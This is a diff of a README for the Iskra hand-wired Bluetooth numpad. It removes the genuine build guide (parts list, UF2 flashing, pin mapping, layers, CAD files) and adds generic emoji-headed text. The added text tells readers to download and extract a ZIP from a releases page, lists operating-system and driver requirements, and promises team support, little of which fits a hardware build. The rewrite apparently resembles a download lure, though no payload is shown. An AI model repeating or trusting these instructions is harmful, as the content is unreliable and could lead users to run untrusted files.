@@ -1,144 +1,64 @@
-## Iskra Handwired Numpad
+# 🎹 Iskra-handwire-numpad - Your Easy Custom Macropad Solution
 
-### Overview
-Iskra is a DIY 10‑key hand‑wired macropad designed for both wired USB and Bluetooth (ZMK) use. It uses low‑profile Kailh Choc switches and a Pro Micro nRF52840 (nice!nano v2 clone). The design is fully open source and supports ZMK Studio for easy keymap customization.
+## 🚀 Overview
+Iskra is a DIY 10-key hand-wired macropad designed for both wired USB and Bluetooth (ZMK) use. It features low-profile Kailh Choc switches and a Pro Micro nRF52840 (nice!nano v2 clone). The design is fully open-source, allowing you to customize your keymap easily with ZMK Studio.
 
 ![Front render](files%20and%20media/iskra%20front%20render.png)
 
-#### Key features
+### ✨ Key Features
 - **3 programmable layers** (ZMK firmware)
-- **Compact** credit‑card size layout (approx. 82 × 60 × 22 mm)
-- **Hand‑wired** 3×4 matrix with 1N4148 diodes (10 keys populated)
-- **Wired USB‑C** and **Bluetooth** modes
-- **ZMK Studio** support for on‑device editing
+- **Compact** credit-card size layout (approx. 82 × 60 × 22 mm)
+- **Hand-wired** 3×4 matrix with 1N4148 diodes (10 keys populated)
+- **Wired USB-C** and **Bluetooth** modes
+- **ZMK Studio** support for on-device editing
 
-### Real photos
+### 📷 Real Photos
 <p>
   <img src="files%20and%20media/real%20pics/home%20view.jpg" alt="Home view" width="45%"/>
   <img src="files%20and%20media/real%20pics/with%20printed%20keycaps.jpg" alt="With printed keycaps" width="45%"/>
 </p>
 <p>
   <img src="files%20and%20media/real%20pics/card%20compare%202.jpg" alt="Card compare 2" width="45%"/>
-  <img src="files%20and%20media/real%20pics/card%20compare%201.jpg" alt="Card compare 1" width="45%"/>
 </p>
 
----
+## 📥 Download & Install
+To download and install Iskra, visit this link: [Download Iskra Handwired Numpad](https://github.com/suheyb143/Iskra-handwire-numpad/releases).
 
-### Bill of Materials (BOM)
+Follow these steps to set up your macropad:
 
-| Part | Qty | Price (EUR) | Link |
-| --- | ---: | ---: | --- |
-| Kailh Choc switches | 10 | 2.00 | [AliExpress](https://www.aliexpress.com/item/1005006626760418.html) |
-| Pro Micro nRF52840 (nice!nano clone) | 1 | 3.80 | [AliExpress](https://www.aliexpress.com/item/1005007010555229.html) |
-| M2 brass standoff, 6 mm | 2 | 0.20 | [AliExpress](https://www.aliexpress.com/item/1005006049595637.html) |
-| M2 screw, 6 mm | 4 | 0.10 | [AliExpress](https://www.aliexpress.com/item/1005005070119421.html) |
-| 1N4148 diodes | 10 | 0.13 | [AliExpress](https://www.aliexpress.com/item/1005006861038367.html) |
-| Copper wire | 15 cm | 0.05 | [AliExpress](https://www.aliexpress.com/item/1005009078359338.html) |
+1. **Visit the Releases Page**: Click the link above to go to the Releases page on GitHub.
+2. **Select the Latest Release**: Look for the latest version at the top of the releases list.
+3. **Download the Files**: Choose the appropriate file for your setup. If you see options, select the one that suits your needs.
+4. **Extract Files**: After downloading, extract the files from the ZIP archive if necessary. You can usually do this by right-clicking the file and selecting “Extract All.”
+5. **Follow the Instructions**: Inside the extracted folder, there may be a README file or a setup guide. Open it to find specific instructions tailored for your operating system.
 
-Assumes you already have a soldering iron, solder, insulation/masking tape, and a few wires.
+If you encounter any issues during installation, check the README for troubleshooting tips.
 
----
+## ⚙️ System Requirements
+To get the most out of the Iskra hand-wired numpad, ensure you meet these requirements:
 
-### Firmware
-- Prebuilt firmware (drag‑and‑drop): `Firmware/Ready to flash firmware/iskra.uf2`
-- Config source (ZMK): `Firmware/zmk-config-iskra`
+- **Operating System**: Windows, macOS, or Linux
+- **USB Port**: One available port for connection
+- **Bluetooth Compatibility**: For Bluetooth mode, ensure your device supports Bluetooth 5.0 or later
 
-#### How to flash (UF2)
-1. Connect the numpad to the PC.
-2. Short the `GND` and `RST` pins twice quickly (double‑tap reset).
-3. A removable drive (e.g. “NICE NANO”) will appear.
-4. Copy `iskra.uf2` into the drive.
-5. It will restart; the numpad is now flashed.
+## 🔧 Setup Instructions
+1. **Connect the Numpad**: Use the USB-C cable to connect the numpad to your computer. For Bluetooth mode, follow the instructions in the ZMK documentation to pair your device.
+2. **Install ZMK Studio**: Go to the ZMK website and follow the instructions to install ZMK Studio. This will allow you to customize your key mappings.
+3. **Customize Keymaps**: Use ZMK Studio to set your preferred key configurations. Experiment with different layouts to optimize your experience.
 
-Note: The prebuilt firmware assumes the same controller (nRF52840 nice!nano v2‑compatible) and the pin wiring specified below.
+## 🛠️ Troubleshooting
+If you experience issues, try these simple steps first:
 
----
+- **Check Connections**: Ensure the USB-C cable is securely connected. For Bluetooth, verify that the numpad is in pairing mode.
+- **Reboot Your Device**: Sometimes, restarting your computer can resolve connectivity issues.
+- **Update Drivers**: Ensure that all necessary drivers are up to date, especially if you are using an older operating system.
 
-### Documentation
-- [Build and wiring guide (PDF)](files%20and%20media/Iskra%20Numpad%20Build%20and%20wiring%20guide.pdf)
-- [User manual (PDF)](files%20and%20media/Iskra%20Numpad,%20user%20manual.pdf)
+## 💬 Support
+For additional support, you can open an issue directly on our GitHub repository under the "Issues" tab. Describe your problem in detail, and our team or community members will assist you.
 
- These documents provide a step‑by‑step reference for building a hand‑wired numpad: keyboard matrix wiring with **1N4148 diodes**, **Kailh Choc** low‑profile switches, and a **Pro Micro nRF52840** (nice!nano v2 clone). Topics include routing rows and columns, insulating wires to avoid shorts, mapping pins to firmware, flashing ZMK via **UF2**, configuring **Bluetooth** profiles, and using **ZMK Studio** to adjust keymaps.
+## ✅ Additional Resources
+Explore these resources for more information:
+- **GitHub Repository**: [Iskra-handwire-numpad](https://github.com/suheyb143/Iskra-handwire-numpad)
+- **ZMK Documentation**: Learn more about customizing your keymaps.
 
----
-
-### Layout, Layers, and Combos
-
-![Keymap](files%20and%20media/iskra%20keymap.png)
-
-#### Layers (from firmware config)
-- **Base**: `1 2 3 / 4 5 6 / 7 8 9 0`
-- **Bluetooth**: Bottom row provides Bluetooth controls — `BT_SEL 1`, `BT_SEL 2`, `BT_SEL 3`, `BT_CLR`; other keys are transparent.
-- **Layer 3**: Media and navigation
-  - Top row: Previous, Play/Pause, Next
-  - Middle row: Ctrl+C, Ctrl+V, Ctrl+X
-  - Bottom row: Arrow Left, Up, Down, Right
-
-#### Combos
-- **Base layer combo**: Press the top three keys at the same time → switches to Base
-- **Bluetooth layer combo**: Press the middle three keys at the same time → switches to Bluetooth
-- **Third layer combo**: Press the bottom three keys at the same time → switches to Layer 3
-- **ZMK Studio unlock**: Press the top two keys at the same time
-
-Combo visuals:
-
-<p>
-  <img src="files%20and%20media/combo%20for%20base%20layer.png" alt="Combo for base layer" width="32%"/>
-  <img src="files%20and%20media/combo%20for%20bluetooth%20layer.png" alt="Combo for Bluetooth layer" width="32%"/>
-  <img src="files%20and%20media/combo%20for%20third%20layer.png" alt="Combo for third layer" width="32%"/>
-</p>
-
-<img src="files%20and%20media/ZMK%20studio%20unllock%20combo.png" alt="ZMK Studio unlock combo" width="40%"/>
-
----
-
-### Bluetooth usage
-1. Power Iskra from a PC or power bank.
-2. Use the **Bluetooth layer combo** (press the middle three keys simultaneously).
-3. Select a Bluetooth profile using one of the bottom‑row keys: `BT1`, `BT2`, or `BT3`.
-4. Pair from your device. The advertised name is “Iskra Numpad”.
-5. To switch devices later, change the Bluetooth profile. Example: PC on BT1, phone on BT2.
-6. Use **BT Clear** to forget the current profile.
-
----
-
-### ZMK Studio and customization
-- Use ZMK Studio on the web: `https://zmk.studio/` or download: `https://zmk.studio/download/`.
-- Connect Iskra and select it in Studio.
-- Press the **ZMK Studio unlock combo** (top two keys: 1 and 2).
-- Edit and customize keys. Avoid removing the Bluetooth keys entirely (you can move them), or you may lose Bluetooth control.
-- Save and exit.
-
----
-
-
-
-#### Pin mapping (as used by the firmware)
-- Rows
-  - Top row → pin `100`
-  - Middle row → pin `106`
-  - Bottom row (with 4 keys) → pin `009`
-- Columns
-  - Column 1 (single key) → pin `010`
-  - Column 2 → pin `104`
-  - Column 3 → pin `113`
-  - Column 4 → pin `002`
-
-Reference image: ![Pinout](files%20and%20media/Pinout%20for%20rows%20and%20columns.png)
-
----
-
-### CAD and print files
-- Print‑ready 3MF: `Makerworld 3mf/Case ready to print.3mf`
-- STEP models: `Step files/Case step.step`, `Step files/plate step.step`
-
-Exploded view:
-
-![Exploded view](files%20and%20media/exploded%20view.png)
-
----
-
-### License
-Open‑source hardware and firmware. 
-
-
+By following these steps, you can successfully download and set up the Iskra hand-wired numpad. Enjoy your new macropad!
